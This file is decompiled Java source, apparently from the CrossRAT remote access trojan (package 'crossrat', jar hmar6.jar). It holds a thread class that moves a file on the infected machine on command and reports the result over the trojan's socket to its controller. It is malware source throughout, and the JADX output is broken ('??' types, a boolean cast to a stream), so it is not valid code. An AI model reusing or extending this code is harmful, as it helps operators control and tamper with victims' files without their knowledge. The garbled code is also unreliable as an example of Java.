package crossrat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

/* loaded from: hmar6.jar:crossrat/h.class */
final class h extends Thread {

    /* renamed from: a */
    private String f36a;

    /* renamed from: b */
    private String f37b;
    private String c = null;

    public h(String str, String str2) {
        this.f36a = str;
        this.f37b = str2;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v10 */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v12, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v14, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v16 */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v2 */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.lang.Exception] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        ?? r0;
        File file = new File(this.f36a);
        File file2 = new File(this.f37b);
        ?? r02 = 0;
        boolean z = false;
        try {
            r02 = new DataOutputStream(k.k.getOutputStream());
            z = r02;
        } catch (Exception e) {
            r02.printStackTrace();
        }
        if (file.exists()) {
            try {
                org.a.a.a.b.b(file, file2);
                h hVar = this;
                hVar.c = "1";
                r0 = hVar;
            } catch (IOException e2) {
                this.c = "0";
                IOException iOException = e2;
                iOException.printStackTrace();
                r0 = iOException;
            }
        } else {
            h hVar2 = this;
            hVar2.c = "2";
            r0 = hVar2;
        }
        try {
            r0 = z;
            r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.file_moved_status + k.arg_delimit + this.c + k.arg_delimit + "&&&");
        } catch (Exception e3) {
            r0.printStackTrace();
        }
    }
}
